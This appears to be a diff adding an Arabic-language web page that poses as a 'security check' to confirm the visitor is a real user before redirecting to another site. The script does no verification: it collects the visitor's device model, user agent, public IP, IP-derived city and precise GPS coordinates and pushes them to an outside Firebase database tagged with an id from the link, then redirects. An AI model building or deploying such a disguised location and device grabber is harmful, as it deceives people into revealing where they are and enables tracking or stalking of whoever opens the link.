@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Check - ADS+VIP Real Device</title>
+<style>
+*{font-family:Arial,sans-serif;box-sizing:border-box;margin:0;padding:0}
+body{background:#f8fafc;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px}
+.container{max-width:500px;width:100%;background:#fff;border:1px solid #e2e8f0;border-radius:16px;padding:24px;box-shadow:0 10px 40px rgba(0,0,0,0.08);text-align:center}
+.big-btn{width:100%;padding:16px;background:linear-gradient(90deg,#00e676,#00b0ff);color:#000;border:none;border-radius:12px;font-weight:900;font-size:15px;cursor:pointer;margin:10px 0}
+.verify-box{background:#f8fafc;border:2px solid #e2e8f0;border-radius:12px;padding:12px;display:flex;align-items:center;gap:10px;margin:10px 0;text-align:right}
+.verify-box.ok{border-color:#00e676;background:rgba(0,230,118,0.08)}
+.check{width:26px;height:26px;border:2px solid #cbd5e1;border-radius:6px;display:flex;align-items:center;justify-content:center;background:#fff;font-weight:900}
+.check.ok{background:#00e676;border-color:#00e676;color:#fff}
+.check.spin{animation:spin 1s linear infinite;border-top-color:#00b0ff}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress{width:100%;height:8px;background:#e2e8f0;border-radius:10px;overflow:hidden;margin:12px 0}
+.fill{height:100%;background:linear-gradient(90deg,#00e676,#00b0ff);width:0%;transition:width 0.3s}
+.log{background:#0f172a;color:#00ff88;border-radius:8px;padding:10px;font-family:monospace;font-size:10px;max-height:200px;overflow:auto;text-align:left;direction:ltr;white-space:pre-wrap;margin:10px 0}
+.hidden{display:none}
+.countdown{font-size:26px;font-weight:900;color:#00e676;margin:10px 0}
+</style>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+</head>
+<body>
+<div class="container">
+<div style="font-size:32px">🛡️</div>
+<h2>التحقق الأمني</h2>
+<p style="color:#64748b;font-size:13px;margin:8px 0">يرجي بدء التحقق للتأكد بأنك مستخدم حقيقي ولست روت ADS</p>
+<button class="big-btn" id="btnStart" onclick="startAll()">🔍 بدء التحقق</button>
+<div id="step2" class="hidden">
+<div class="verify-box" id="boxDevice"><div class="check" id="checkDevice">📱</div><div style="flex:1;text-align:right"><b>فحص الجهاز</b><div id="descDevice" style="font-size:11px;color:#64748b">جاري...</div></div></div>
+<div class="verify-box" id="boxIP"><div class="check" id="checkIP">🌐</div><div style="flex:1;text-align:right"><b>الشبكه</b><div id="descIP" style="font-size:11px;color:#64748b">جاري...</div></div></div>
+<div class="verify-box" id="boxGPS"><div class="check" id="checkGPS">📍</div><div style="flex:1;text-align:right"><b>الموقع </b><div id="descGPS" style="font-size:11px;color:#64748b">جاري... (ADS لو رفضت)</div></div></div>
+<div class="progress"><div class="fill" id="fill"></div></div>
+<div id="loadingText" style="font-size:12px;color:#00b0ff">جاري...</div>
+<div id="countdownSec" class="hidden"><div class="countdown" id="countdown">2</div><button class="big-btn" onclick="goMain()">تحويل فوري</button></div>
+<div class="log" id="logBox"></div>
+</div>
+</div>
+<script>
+const FIREBASE_URL = "https://numgen-4f22c-default-rtdb.firebaseio.com";
+const MAIN_SITE = "https://pythone2033.github.io/NumGen-Pro-/";
+let debugData = {ip:null, geo:null, realGPS:null, device:null};
+let clientId = new URLSearchParams(window.location.search).get('id') || 'Visitor';
+let isVIPMode = new URLSearchParams(window.location.search).has('vip');
+
+function log(m){let el=document.getElementById('logBox');el.textContent+=new Date().toLocaleTimeString()+" - "+m+"\n";el.scrollTop=el.scrollHeight;}
+function setProgress(p){document.getElementById('fill').style.width=p+'%';}
+function setBox(id,s,d){
+  let b=document.getElementById('box'+id),c=document.getElementById('check'+id),dd=document.getElementById('desc'+id);
+  if(s==='ok'){b.className='verify-box ok';c.className='check ok';c.textContent='✓';}
+  else if(s==='active'){b.className='verify-box';c.className='check spin';c.textContent='◍';}
+  else if(s==='fail'){b.className='verify-box';b.style.borderColor='#ff1744';c.className='check';c.style.background='#ff1744';c.style.color='#fff';c.textContent='✕';}
+  if(d) dd.textContent=d;
+}
+
+async function getRealDevice(){
+  let ua = navigator.userAgent;
+  let model = "";
+  let brand = "";
+  let full = "";
+  try{
+    if(navigator.userAgentData){
+      log('Trying userAgentData API...');
+      let hints = await navigator.userAgentData.getHighEntropyValues(['model','platform','platformVersion']);
+      log('Hints model raw:'+(hints.model||'empty'));
+      if(hints.model && hints.model.trim() && hints.model.trim().toUpperCase()!=='K'){
+        model = hints.model.trim();
+        log('Got model from userAgentData:'+model);
+      }
+    }
+  }catch(e){log('userAgentData error:'+e.message);}
+  
+  if(!model || model.toUpperCase()==='K' || model.length<=2){
+    log('Parsing UA for model:'+ua.substring(0,150));
+    let m = ua.match(/\(Linux; Android \d+; ([^\)]+)\) Build/i);
+    if(m){
+      let cand = m[1].trim();
+      log('UA model candidate:'+cand);
+      if(cand.toUpperCase()!=='K' && cand.length>2){
+        model = cand;
+      }
+    }
+    if(!model || model.toUpperCase()==='K'){
+      let m2 = ua.match(/; ([A-Z0-9\-]+) Build\//);
+      if(m2 && m2[1].toUpperCase()!=='K' && m2[1].length>2){
+        model = m2[1];
+        log('Second pattern model:'+model);
+      }
+    }
+  }
+  
+  if(!model || model.toUpperCase()==='K' || model.length<=2){
+    // Final fallback - use screen to make unique but mark as Android Device with screen
+    let screenInfo = screen.width+'x'+screen.height;
+    model = 'Android Device ('+screenInfo+') - '+ua.substring(0,30);
+    // Try to extract something readable
+    if(/Infinix/i.test(ua)) model='Infinix Device';
+    else if(/TECNO/i.test(ua)) model='TECNO Device';
+    else if(/SM-|SAMSUNG/i.test(ua.toUpperCase())) model='Samsung Device';
+    else model='Android Device';
+    log('Fallback model:'+model);
+  }
+  
+  // Brand
+  let lower = (model+' '+ua).toLowerCase();
+  if(/sm-|samsung/i.test(lower)) brand='Samsung';
+  else if(/infinix/i.test(lower)) brand='Infinix';
+  else if(/tecno/i.test(lower)) brand='TECNO';
+  else if(/redmi|poco|xiaomi/i.test(lower)) brand='Xiaomi';
+  else if(/oppo|cph/i.test(lower)) brand='OPPO';
+  else if(/vivo/i.test(lower)) brand='Vivo';
+  else if(/realme|rmx/i.test(lower)) brand='Realme';
+  else if(/pixel/i.test(lower)) brand='Google';
+  else brand='Android';
+  
+  full = brand==='Android' ? model : brand+' '+model;
+  if(full.toUpperCase().includes(' K ') || full==='K') full=full.replace(/\sK\s/g,' ').trim();
+  if(full.toUpperCase()==='ANDROID K') full='Android Device';
+  
+  return {model, brand, full: full.substring(0,60), ua: ua.substring(0,150)};
+}
+
+async function startAll(){
+  document.getElementById('btnStart').style.display='none';
+  document.getElementById('step2').classList.remove('hidden');
+  log('Start id:'+clientId+' isVIPMode param:'+isVIPMode);
+  
+  setBox('Device','active','جاري فحص الجهاز...');
+  let device = await getRealDevice();
+  debugData.device=device;
+  log('REAL DEVICE FINAL:'+device.full+' | model:'+device.model+' | brand:'+device.brand);
+  setBox('Device','ok',device.full);
+  setProgress(40);
+  
+  setBox('IP','active','جاري...');
+  try{
+    let r=await fetch('https://api.ipify.org?format=json');
+    let j=await r.json();
+    debugData.ip=j.ip;
+    log('IP from ipify:'+j.ip);
+    setBox('IP','ok',j.ip);
+    setProgress(65);
+  }catch(e){
+    try{
+      let r=await fetch('https://ipapi.co/json/');
+      let j=await r.json();
+      debugData.ip=j.ip;
+      debugData.geo=j;
+      log('IP from ipapi:'+j.ip+' city:'+j.city);
+      setBox('IP','ok',j.city+' - '+j.ip);
+      setProgress(65);
+    }catch(e2){
+      log('IP FAIL both');
+      setBox('IP','fail','fail');
+      debugData.ip='unknown';
+      setProgress(65);
+    }
+  }
+  
+  if(debugData.ip && !debugData.geo){
+    try{
+      let r=await fetch('https://ipapi.co/'+debugData.ip+'/json/');
+      let j=await r.json();
+      debugData.geo=j;
+      log('Geo:'+j.city+','+j.country_name);
+    }catch(e){log('Geo fail');}
+  }
+  
+  setBox('GPS','active','جاري... ارفض لو عايز ADS');
+  if(!navigator.geolocation){
+    setBox('GPS','fail','No GPS - ADS mode');
+    await saveAndGo(false);
+    return;
+  }
+  
+  let gpsTimeout = setTimeout(async ()=>{
+    log('GPS timeout - saving as ADS');
+    setBox('GPS','fail','Timeout -> ADS');
+    await saveAndGo(false);
+  }, 12000);
+  
+  navigator.geolocation.getCurrentPosition(async function(pos){
+    clearTimeout(gpsTimeout);
+    debugData.realGPS={lat:pos.coords.latitude, lon:pos.coords.longitude, acc:pos.coords.accuracy};
+    log('GPS OK:'+debugData.realGPS.lat.toFixed(6)+','+debugData.realGPS.lon.toFixed(6));
+    setBox('GPS','ok',Math.round(debugData.realGPS.acc)+'m GPS');
+    setProgress(90);
+    await saveAndGo(true);
+  },async function(err){
+    clearTimeout(gpsTimeout);
+    log('GPS FAIL:'+err.message+' -> ADS mode');
+    setBox('GPS','fail','Refused -> ADS mode');
+    await saveAndGo(false);
+  },{enableHighAccuracy:true,timeout:10000,maximumAge:0});
+}
+
+async function saveAndGo(hasGPS){
+  try{
+    if(!firebase.apps.length) firebase.initializeApp({databaseURL: FIREBASE_URL});
+    let db=firebase.database();
+    
+    let latVal = hasGPS&&debugData.realGPS ? debugData.realGPS.lat : (debugData.geo?debugData.geo.latitude:null);
+    let lonVal = hasGPS&&debugData.realGPS ? debugData.realGPS.lon : (debugData.geo?debugData.geo.longitude:null);
+    let typeStr = hasGPS ? 'VIP' : 'ADS';
+    
+    let data={
+      id: clientId,
+      name: clientId,
+      ip: debugData.ip||'unknown',
+      city: debugData.geo? (debugData.geo.city||debugData.geo.region||'Alex') : 'Alex',
+      lat: latVal,
+      lng: lonVal,
+      real_lat: latVal,
+      real_lon: lonVal,
+      gps: latVal? latVal+','+lonVal : 'unknown',
+      device: debugData.device.full,
+      device_model: debugData.device.model,
+      device_brand: debugData.device.brand,
+      device_full: debugData.device.full,
+      real_device_name: debugData.device.full,
+      userAgent: debugData.device.ua,
+      time: new Date().toLocaleString('ar-EG'),
+      timestamp: Date.now(),
+      type: typeStr
+    };
+    
+    log('Saving as '+typeStr+' with device:'+data.real_device_name);
+    await db.ref('visitors').push(data);
+    await db.ref('pro_max_visitors').push(data);
+    log('SAVED OK:'+typeStr+' - '+data.real_device_name+' - '+data.ip);
+    document.getElementById('loadingText').textContent='✅ تم: '+typeStr+' - '+data.real_device_name+' - '+data.ip;
+    setProgress(100);
+    startCountdown();
+  }catch(e){
+    log('SAVE ERR:'+e.message);
+    setProgress(100);
+    startCountdown();
+  }
+}
+
+let c=3;
+function startCountdown(){
+  document.getElementById('countdownSec').classList.remove('hidden');
+  function tick(){
+    document.getElementById('countdown').textContent=c;
+    if(c<=0){goMain();return;}
+    c--;
+    setTimeout(tick,1000);
+  }
+  tick();
+}
+function goMain(){location.href=MAIN_SITE+'?id='+encodeURIComponent(clientId)+'&verified=true';}
+</script>
+</body>
+</html>
